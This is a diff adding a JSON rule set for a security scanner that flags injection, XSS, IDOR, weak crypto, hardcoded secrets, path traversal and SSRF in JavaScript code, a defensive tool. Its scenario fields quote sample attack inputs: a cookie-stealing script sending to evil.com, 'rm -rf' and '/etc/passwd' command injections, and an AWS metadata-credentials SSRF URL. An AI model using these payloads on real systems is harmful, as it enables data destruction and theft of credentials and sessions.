@@ -1,0 +1,605 @@
+{
+  "schema_version": 1,
+  "rules": [
+    {
+      "id": "INJ-001",
+      "variant": "direct",
+      "name": "SQL Injection – string concatenation",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:query|sql)\\s*[=+]\\s*[`'\\\"]\\s*SELECT[\\s\\S]{0,80}\\$\\{|(?:query|sql)\\s*[=+]\\s*[`'\\\"]\\s*SELECT[\\s\\S]{0,80}\\+\\s*\\w",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "User input is concatenated directly into the SQL query without sanitisation.",
+      "scenario": "An attacker enters ' OR '1'='1 in an input field and gains access to the entire database. Can also delete data or take over the server.",
+      "fix": "Always use parameterised queries: db.query(\"SELECT * FROM users WHERE id = ?\", [id])"
+    },
+    {
+      "id": "INJ-002",
+      "variant": "direct",
+      "name": "XSS – unsanitised innerHTML",
+      "severity": "HIGH",
+      "category": "Injection (OWASP A03)",
+      "pattern": "\\.innerHTML\\s*=\\s*(?!['\\\"`]\\s*['\\\"`])[^;]{0,120}(?:req\\.|request\\.|params\\.|query\\.|body\\.|\\$_GET|\\$_POST|location\\.|search\\b|hash\\b)",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx"
+      ],
+      "why": "User data is rendered directly as HTML without escaping.",
+      "scenario": "An attacker injects <script>document.location=\"https://evil.com?c=\"+document.cookie</script> and steals session cookies from all visitors.",
+      "fix": "Use textContent instead of innerHTML, or sanitise with DOMPurify before assignment."
+    },
+    {
+      "id": "INJ-003",
+      "variant": "direct",
+      "name": "Command Injection – shell execution with user input",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:exec|execSync|spawn|spawnSync|execFile)\\s*\\(\\s*(?:[`'\\\"]\\s*[^`'\\\"]*\\$\\{(?:req|request|params|query|body|input|cmd|command)[^}]*\\}|[`'\\\"]\\s*\\+\\s*(?:req|request|params|query|body))",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "Shell commands are built with unvalidated user input and executed directly on the server.",
+      "scenario": "An attacker sends \"; rm -rf /var/www\" as input. The server executes it as a shell command with the application's privileges.",
+      "fix": "Avoid exec with user input. Use parameterised alternatives (child_process.execFile) or whitelist allowed values."
+    },
+    {
+      "id": "INJ-001",
+      "variant": "taint",
+      "name": "SQL Injection – tainted variable in query",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:const|let|var)?\\s*(?:sql|query|qry|SQL|stmt)\\s*[=+]=?\\s*[`'\\\"][^`'\\\"]{0,200}(?:SELECT|INSERT|UPDATE|DELETE)[^`'\\\"]{0,200}[`'\\\"]\\s*[+\\n]|(?:db|pool|conn|client|knex|sequelize)\\s*\\.\\s*(?:query|execute|raw)\\s*\\(\\s*[^\\n'\\\"]{0,200}",
+      "flags": "gi",
+      "antipattern": "\\?\\s*[,\\])]|prepare\\s*\\(|parameterized|\\$\\d+|\\bplaceholder",
+      "antipattern_flags": "i",
+      "taint_aware": true,
+      "taint_extract": "concat",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "A variable assigned from req.query/req.body is concatenated into a SQL query without parameterisation.",
+      "scenario": "const id = req.query.id; db.query(\"SELECT * FROM users WHERE id = \" + id) — attacker sends ?id=1 OR 1=1.",
+      "fix": "Use parameterised queries: db.query(\"SELECT * FROM users WHERE id = ?\", [id])"
+    },
+    {
+      "id": "INJ-002",
+      "variant": "taint",
+      "name": "XSS – tainted variable assigned to innerHTML",
+      "severity": "HIGH",
+      "category": "Injection (OWASP A03)",
+      "pattern": "\\.innerHTML\\s*=\\s*[^\\n;]{0,200}",
+      "flags": "g",
+      "antipattern": "DOMPurify|sanitize|escapeHtml|textContent\\s*=|innerText\\s*=",
+      "taint_aware": true,
+      "taint_extract": "concat",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx"
+      ],
+      "why": "A variable assigned from user input is rendered as HTML without escaping.",
+      "scenario": "const name = req.query.name; el.innerHTML = name — attacker injects <script> tags.",
+      "fix": "Use textContent instead of innerHTML, or sanitise with DOMPurify.sanitize() before assignment."
+    },
+    {
+      "id": "INJ-003",
+      "variant": "taint",
+      "name": "Command Injection – tainted variable in shell command",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\\s*\\(\\s*[^\\n]{0,200}",
+      "flags": "g",
+      "antipattern": "execFile\\s*\\(\\s*['\\\"][\\w/]|shell\\s*:\\s*false|\\bshellEscape\\b",
+      "antipattern_flags": "i",
+      "taint_aware": true,
+      "taint_extract": "concat",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "A variable assigned from req.query/req.body is passed to a shell command without sanitisation.",
+      "scenario": "const cmd = req.query.cmd; exec(cmd) — attacker sends ?cmd=; cat /etc/passwd.",
+      "fix": "Never pass user input to exec(). Use execFile() with an array of arguments, never a shell string."
+    },
+    {
+      "id": "INJ-004",
+      "name": "Unparameterized query – dynamic string construction",
+      "severity": "HIGH",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:db|pool|conn|client|connection|knex|sequelize|pgClient|mysql)\\s*\\.\\s*(?:query|execute|raw)\\s*\\((?!\\s*['\\\"`][^'\\\"`]*['\\\"`]\\s*,\\s*[([\\[])(?:[^)]{0,400})(?:\\$\\{[^}]{1,60}\\}|['\\\"`]\\s*\\+\\s*\\w|\\w\\s*\\+\\s*['\\\"`])",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "The SQL query is constructed with string concatenation or a template literal. Even if current values appear safe, this pattern invites SQL injection as the codebase grows.",
+      "scenario": "A developer adds a new dynamic value later using the same pattern — one unescaped value exposes the entire query.",
+      "fix": "Use parameterised queries: db.query(\"SELECT * FROM t WHERE id = ?\", [id]) — never interpolate variables into query strings."
+    },
+    {
+      "id": "AUTH-001",
+      "name": "Route missing authentication middleware",
+      "severity": "HIGH",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "(?:app|router)\\.(?:get|post|put|delete|patch)\\s*\\(\\s*['\\\"`][^'\\\"`)]+['\\\"`]\\s*,\\s*async\\s*\\(",
+      "flags": "g",
+      "lookahead": 0,
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "Route is missing visible authentication middleware — data may be accessible without logging in.",
+      "scenario": "Anyone can call the endpoint directly without being logged in and access data that should be protected.",
+      "fix": "Add auth middleware as the second argument: router.get(\"/data\", requireAuth, async (req, res) => { ... })"
+    },
+    {
+      "id": "AUTH-002",
+      "name": "IDOR – object fetched without ownership check",
+      "severity": "HIGH",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "(?:findById|findOne|findByPk|getById)\\s*\\(\\s*req\\.(?:params|query|body)\\.\\w+\\s*\\)",
+      "flags": "g",
+      "antipattern": "(?:userId|ownerId|createdBy|user\\.id|req\\.user)\\s*[:=]",
+      "lookahead": 200,
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "Objects are fetched directly with an ID from the URL/body without verifying that the user owns them.",
+      "scenario": "A user with order ID 42 can change the URL to /api/orders/99 and view another customer's order. Known as Insecure Direct Object Reference (IDOR).",
+      "fix": "Always add an ownership check: db.findOne({ _id: id, userId: req.user.id })"
+    },
+    {
+      "id": "AUTH-003",
+      "name": "Mass assignment – uncontrolled req.body",
+      "severity": "HIGH",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "(?:create|update|save|insert)\\s*\\(\\s*req\\.body\\s*\\)",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "The entire req.body is passed directly to a database operation without whitelist filtering.",
+      "scenario": "An attacker adds isAdmin: true to their POST request and gains administrator privileges if the field exists in the database.",
+      "fix": "Destructure and whitelist specific fields: const { name, email } = req.body; User.create({ name, email })"
+    },
+    {
+      "id": "AUTH-004",
+      "name": "Password in URL-encoded string – risk of GET exposure",
+      "severity": "MEDIUM",
+      "category": "Identification and Authentication Failures (OWASP A07)",
+      "pattern": "['\\\"&]password=[\\\"']\\s*\\+\\s*\\w+|`[^`]*password=\\$\\{",
+      "flags": "gi",
+      "antipattern": "type\\s*[:=]\\s*['\\\"]GET['\\\"]",
+      "antipattern_flags": "i",
+      "lookahead": 400,
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "A URL-encoded string containing password= risks ending up as a GET parameter in the URL, exposing the password in server logs, browser history and Referer headers.",
+      "scenario": "If $.ajax({url: endpoint + \"?\" + postdata}) is used instead of POST, the password appears in the URL and is visible in Apache/nginx logs.",
+      "fix": "Send passwords as JSON via fetch/axios: fetch(url, { method: \"POST\", body: JSON.stringify({ username, password }) }) — never as a query string."
+    },
+    {
+      "id": "JWT-001",
+      "name": "JWT not verified – decode without verify",
+      "severity": "CRITICAL",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "jwt\\.decode\\s*\\([^)]+\\)",
+      "flags": "g",
+      "antipattern": "jwt\\.verify",
+      "lookahead": 500,
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "jwt.decode() does not check the signature — anyone can create an arbitrary token.",
+      "scenario": "An attacker creates a JWT with payload {\"role\":\"admin\"} without knowing the secret. Without signature verification it is accepted as valid.",
+      "fix": "Always use jwt.verify(token, secret) instead of jwt.decode(token)."
+    },
+    {
+      "id": "JWT-002",
+      "name": "JWT stored in localStorage",
+      "severity": "HIGH",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "localStorage\\.setItem\\s*\\(\\s*['\\\"`][^'\\\"`)]*(?:token|jwt|auth)[^'\\\"`)]*['\\\"`]",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "localStorage is accessible via JavaScript and vulnerable to XSS attacks.",
+      "scenario": "If an XSS vulnerability exists, an attacker can read localStorage and steal all tokens. HttpOnly cookies are not accessible via JavaScript.",
+      "fix": "Store tokens in httpOnly, Secure cookies instead of localStorage."
+    },
+    {
+      "id": "CRYPTO-001",
+      "name": "Weak password hashing algorithm (MD5/SHA1)",
+      "severity": "HIGH",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "(?:crypto\\.createHash\\s*\\(\\s*['\\\"`](?:md5|sha1)['\\\"`]|require\\s*\\(\\s*['\\\"`]md5['\\\"`]\\s*\\))",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "cjs"
+      ],
+      "why": "MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.",
+      "scenario": "An attacker who steals your database can crack MD5-hashed passwords using rainbow tables in minutes. Millions of passwords are already pre-hashed online.",
+      "fix": "Use bcrypt, argon2 or scrypt for passwords: const hash = await bcrypt.hash(password, 12)"
+    },
+    {
+      "id": "FRONT-001",
+      "name": "Mapbox public token in frontend",
+      "severity": "EXPOSURE",
+      "category": "Frontend Exposure",
+      "pattern": "['\\\"`]pk\\.eyJ[a-zA-Z0-9._-]{20,}['\\\"`]",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx",
+        "html"
+      ],
+      "why": "Mapbox public tokens are intended for frontend use but require active domain restriction to be safe.",
+      "scenario": "Without domain restriction anyone can use your token for map requests at your expense.",
+      "checklist": [
+        "Domain restriction enabled in Mapbox Account → Tokens",
+        "Scope limited to required services only",
+        "Usage limits (rate limits) configured",
+        "Rotation plan documented if token is abused"
+      ],
+      "fix": "Enable domain restriction in Mapbox Account → Tokens. Set usage limits."
+    },
+    {
+      "id": "FRONT-002",
+      "name": "Google Maps API key in frontend",
+      "severity": "EXPOSURE",
+      "category": "Frontend Exposure",
+      "pattern": "['\\\"`]AIza[0-9A-Za-z_-]{35}['\\\"`]",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx",
+        "html"
+      ],
+      "why": "Google Maps API keys in frontend code are visible to everyone. Google recommends HTTP referrer restrictions.",
+      "scenario": "Unrestricted Google Maps keys can be abused and result in unexpected costs. Cases involving thousands of dollars in unintended charges are well documented.",
+      "checklist": [
+        "HTTP referrer restriction enabled in Google Cloud Console",
+        "API restriction – only Maps JavaScript API enabled for this key",
+        "Billing alerts configured in Google Cloud",
+        "Separate key for production vs. development"
+      ],
+      "fix": "Enable HTTP referrer restriction in Google Cloud Console. Set API restrictions and billing alerts."
+    },
+    {
+      "id": "FRONT-003",
+      "name": "Stripe publishable key in frontend",
+      "severity": "EXPOSURE",
+      "category": "Frontend Exposure",
+      "pattern": "['\\\"`]pk_live_[a-zA-Z0-9]{24,}['\\\"`]",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx"
+      ],
+      "why": "Stripe's publishable key is public by design but its exposure should be documented and Radar rules should be active.",
+      "scenario": "A publishable key can be used to create payment forms in your name for social engineering attacks.",
+      "checklist": [
+        "Confirmed this is the publishable key (pk_live_) — NOT the secret key (sk_live_)",
+        "Stripe Radar rules configured to flag unusual activity",
+        "Webhook verification enabled for all incoming events"
+      ],
+      "fix": "Confirm Radar rules are active in Stripe Dashboard. Verify webhook signatures."
+    },
+    {
+      "id": "FRONT-004",
+      "name": "Firebase configuration in frontend",
+      "severity": "EXPOSURE",
+      "category": "Frontend Exposure",
+      "pattern": "apiKey\\s*:\\s*['\\\"`][A-Za-z0-9_-]{35,}['\\\"`]",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs",
+        "jsx",
+        "tsx"
+      ],
+      "why": "Firebase config in the frontend requires correctly configured Security Rules — otherwise the database is open.",
+      "scenario": "Without strict Security Rules anyone with your Firebase config can read or write to your database.",
+      "checklist": [
+        "Firebase Security Rules reviewed and tested",
+        "Authentication enabled — no anonymous write operations permitted",
+        "App Check enabled to verify that requests originate from your app"
+      ],
+      "fix": "Review and test Firebase Security Rules. Enable App Check."
+    },
+    {
+      "id": "FRONT-005",
+      "name": "Source map exposed in production",
+      "severity": "EXPOSURE",
+      "category": "Frontend Exposure",
+      "pattern": "\\/\\/[#@]\\s*sourceMappingURL\\s*=\\s*(?!data:)[^\\s]+\\.map",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "ts",
+        "mjs"
+      ],
+      "why": "Source map files (.map) should never be served in production. Their presence indicates the build pipeline is not stripping source maps before deployment — which means your own bundled source code is very likely exposed as well.",
+      "scenario": "An attacker opens DevTools, finds the sourceMappingURL reference, and downloads the .map file. They can now read the original unminified source of your application.",
+      "checklist": [
+        "Source maps are NOT generated in the production build (check webpack/vite/rollup config)",
+        "If source maps are needed for error tracking — use a private source map server (e.g. Sentry)",
+        "Verify that .map files are blocked by the web server / CDN in production",
+        "Check that CI/CD pipeline does not deploy the /dist folder including .map files"
+      ],
+      "fix": "Disable source map generation in production build config. Use a private source map service for error tracking."
+    },
+    {
+      "id": "JS-SECRET-001",
+      "name": "Hardcoded API key or secret in source code",
+      "severity": "CRITICAL",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:api[_-]?key|api[_-]?secret|app[_-]?secret|client[_-]?secret|access[_-]?token|auth[_-]?token|bearer[_-]?token|private[_-]?key)\\s*[:=]\\s*['\\\"`][a-zA-Z0-9\\-_\\/+]{16,}['\\\"`]",
+      "flags": "gi",
+      "antipattern": "process\\.env|config\\.|getenv|os\\.environ|\\$\\{|\\btest\\b|\\bmock\\b|\\bexample\\b|\\bplaceholder\\b",
+      "antipattern_flags": "i",
+      "lookahead": 60,
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Hardcoded secrets are exposed to everyone with repository access — current and former employees, CI systems, forks, and anyone who finds the repo public or leaked.",
+      "scenario": "Developer hardcodes const API_SECRET = \"sk-prod-abc123...\" during local testing. It ships in a commit, the repo becomes public six months later, the secret is harvested within hours by automated scanners.",
+      "fix": "const apiSecret = process.env.API_SECRET. Store secrets in .env (git-ignored) locally, and in environment variables or a secrets manager in production."
+    },
+    {
+      "id": "JS-SECRET-002",
+      "name": "Hardcoded JWT secret or encryption key",
+      "severity": "CRITICAL",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:jwt\\.sign|jwt\\.verify|createHmac|createCipheriv|createDecipheriv)\\s*\\([^)]{0,200},[^)]{0,100}['\\\"`][a-zA-Z0-9\\-_\\/+]{8,}['\\\"`]",
+      "flags": "g",
+      "antipattern": "process\\.env|config\\.",
+      "antipattern_flags": "i",
+      "lookahead": 40,
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "A hardcoded JWT secret means all tokens can be forged by anyone who reads the source code. A hardcoded encryption key means all encrypted data can be decrypted.",
+      "scenario": "jwt.sign(payload, \"mysecretkey\") is in source. Attacker reads the key from GitHub, signs arbitrary payloads, and impersonates any user.",
+      "fix": "const secret = process.env.JWT_SECRET. Generate with: node -e \"console.log(require('crypto').randomBytes(64).toString('hex'))\". Minimum 256 bits for HMAC-SHA256."
+    },
+    {
+      "id": "JS-REDIRECT-001",
+      "name": "Open redirect — unvalidated URL from request used in redirect",
+      "severity": "HIGH",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "res\\s*\\.\\s*redirect\\s*\\(\\s*req\\s*\\.\\s*(?:query|body|params)\\s*(?:\\.\\s*\\w+|\\[['\\\"][^'\\\"]+['\\\"]\\])",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Redirecting to an attacker-controlled URL enables phishing — users see a legitimate domain in the link and are redirected to a malicious site after clicking.",
+      "scenario": "Login flow: res.redirect(req.query.returnUrl). Attacker sends users a link to yourapp.com/login?returnUrl=https://evil.com/fake-login.",
+      "fix": "Validate the redirect target: const allowed = [\"/dashboard\", \"/profile\"]; res.redirect(allowed.includes(target) ? target : \"/\"). Only allow relative paths or explicitly allowlisted URLs."
+    },
+    {
+      "id": "JS-PATH-001",
+      "name": "Path traversal — user input used directly in file system operation",
+      "severity": "CRITICAL",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "fs\\s*\\.\\s*(?:readFile|readFileSync|writeFile|writeFileSync|appendFile|unlink|stat|access)\\s*\\(\\s*(?:req\\s*\\.\\s*(?:query|body|params)|path\\s*\\.\\s*(?:join|resolve)\\s*\\([^)]{0,100}req)",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Using request input directly in file system calls allows directory traversal. path.join() does not sanitize — path.join(\"/uploads\", \"../../etc/passwd\") resolves to /etc/passwd.",
+      "scenario": "GET /file?name=report.pdf becomes fs.readFile(path.join(__dirname, req.query.name)). Attacker requests ?name=../../etc/passwd and receives the server's password file.",
+      "fix": "Resolve and validate: const base = path.resolve(\"/safe/uploads\"); const target = path.resolve(base, req.query.name); if (!target.startsWith(base)) return res.status(403).send(\"Forbidden\");"
+    },
+    {
+      "id": "JS-CRYPTO-002",
+      "name": "Weak random number generator used for security-sensitive value",
+      "severity": "HIGH",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "Math\\.random\\s*\\(\\s*\\)[\\s\\S]{0,120}(?:token|secret|password|csrf|nonce|salt|otp|code|key|session|id)\\b|\\b(?:token|secret|password|csrf|nonce|salt|otp|code|key|session)\\b[\\s\\S]{0,120}Math\\.random\\s*\\(\\s*\\)",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "confidence_rules": [
+        {
+          "if_line_contains": [
+            "numId",
+            "cssName",
+            "container",
+            "dashboard",
+            "modal",
+            "widget",
+            "panel",
+            "grid",
+            "element"
+          ],
+          "confidence": "LOW"
+        },
+        {
+          "if_line_contains": [
+            "nonce",
+            "state",
+            "csrf",
+            "oidc",
+            "oauth",
+            "auth",
+            "reset_token",
+            "verify",
+            "session_id",
+            "refresh_token"
+          ],
+          "confidence": "HIGH"
+        },
+        {
+          "if_path_contains": [
+            "auth",
+            "login",
+            "oauth",
+            "oidc",
+            "token",
+            "security",
+            "crypto"
+          ],
+          "confidence": "HIGH"
+        },
+        {
+          "default": "MEDIUM"
+        }
+      ],
+      "why": "Math.random() is a pseudo-random number generator (PRNG) — not a cryptographically secure RNG. Its output is predictable given enough observed values.",
+      "scenario": "const resetToken = Math.random().toString(36).slice(2) used as a password-reset token. An attacker who observes a few tokens can statistically predict the next one and take over any account.",
+      "fix": "Use the built-in crypto module: const token = require(\"crypto\").randomBytes(32).toString(\"hex\"). For shorter codes: crypto.randomInt(100000, 999999)."
+    },
+    {
+      "id": "JS-CRYPTO-003",
+      "name": "Hardcoded encryption key or IV in crypto operation",
+      "severity": "CRITICAL",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "(?:createCipheriv|createDecipheriv)\\s*\\([^)]{0,300}['\\\"`][a-zA-Z0-9+\\/=\\-_]{8,}['\\\"`]\\s*,\\s*['\\\"`][a-zA-Z0-9+\\/=\\-_]{8,}['\\\"`]",
+      "flags": "g",
+      "antipattern": "process\\.env|config\\.",
+      "antipattern_flags": "i",
+      "lookahead": 60,
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Hardcoding the encryption key and IV means all encrypted data uses the same key, visible to anyone with source access. A static IV also makes the encryption deterministic.",
+      "scenario": "createCipheriv(\"aes-256-cbc\", \"mysecretkey12345\", \"myiv123456789012\") in source. Attacker reads key and IV, decrypts all stored data.",
+      "fix": "Key: const key = Buffer.from(process.env.ENCRYPTION_KEY, \"hex\"). IV: generate fresh for every encryption: const iv = crypto.randomBytes(16)."
+    },
+    {
+      "id": "JS-ERR-001",
+      "name": "Exception details or stack trace exposed to client in error response",
+      "severity": "HIGH",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "res\\s*\\.\\s*(?:json|send)\\s*\\(\\s*(?:err|error|e|ex)\\s*[),]|res\\s*\\.\\s*status\\s*\\([^)]+\\)\\s*\\.\\s*(?:json|send)\\s*\\(\\s*(?:err|error|e|ex)\\s*[),]|res\\s*\\.\\s*(?:json|send|status\\s*\\([^)]+\\)\\s*\\.(?:json|send))\\s*\\([^)]{0,200}(?:\\.stack\\b|error\\.message[^)]{0,100}stack)",
+      "flags": "gs",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Returning raw error objects or stack traces to the client reveals internal file paths, library versions, database schema details, and application logic.",
+      "scenario": "catch (err) { res.json(err) } — the response includes stack: \"at /home/app/src/db/users.js:47:12\". Attacker now knows the internal path structure and exact table names.",
+      "fix": "Log the full error server-side; return a generic message to the client: catch (err) { logger.error(err); res.status(500).json({ error: \"Internal server error\" }) }"
+    },
+    {
+      "id": "JS-ERR-002",
+      "name": "Sensitive request data logged to console",
+      "severity": "MEDIUM",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "console\\s*\\.\\s*(?:log|error|warn|info|debug)\\s*\\([^)]{0,200}(?:req\\s*\\.\\s*(?:body|headers|cookies)|password|token|secret|authorization|api.?key)",
+      "flags": "gi",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Logging request bodies, auth headers, or sensitive fields sends credentials and tokens to stdout/stderr — collected by log aggregation systems and often retained for months.",
+      "scenario": "console.log(\"Login attempt:\", req.body) logs { username: \"admin\", password: \"hunter2\" } to production logs.",
+      "fix": "Log only what you need, and sanitize: const safe = { ...req.body }; delete safe.password; logger.info(\"Login attempt\", safe). Use a structured logger (pino, winston) with log levels."
+    },
+    {
+      "id": "JS-SSRF-001",
+      "name": "SSRF — user-controlled URL passed to fetch, axios or http request",
+      "severity": "HIGH",
+      "category": "Server-Side Request Forgery (OWASP A10)",
+      "pattern": "(?:fetch|axios\\s*\\.\\s*(?:get|post|put|delete|request)|https?\\s*\\.\\s*(?:get|request))\\s*\\(\\s*(?:req\\s*\\.\\s*(?:query|body|params)|[^,)]{0,60}req\\s*\\.\\s*(?:query|body|params))",
+      "flags": "g",
+      "file_types": [
+        "js",
+        "mjs",
+        "cjs",
+        "ts",
+        "tsx"
+      ],
+      "why": "Passing user-supplied URLs to outbound HTTP requests allows attackers to make the server send requests to internal infrastructure — cloud metadata endpoints, internal databases, admin panels.",
+      "scenario": "fetch(req.query.url) to proxy an image. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS IAM credentials.",
+      "fix": "Validate and restrict: parse the URL, check scheme (https only), resolve hostname and verify it is not a private/loopback range. Use an allowlist of permitted domains."
+    }
+  ]
+}
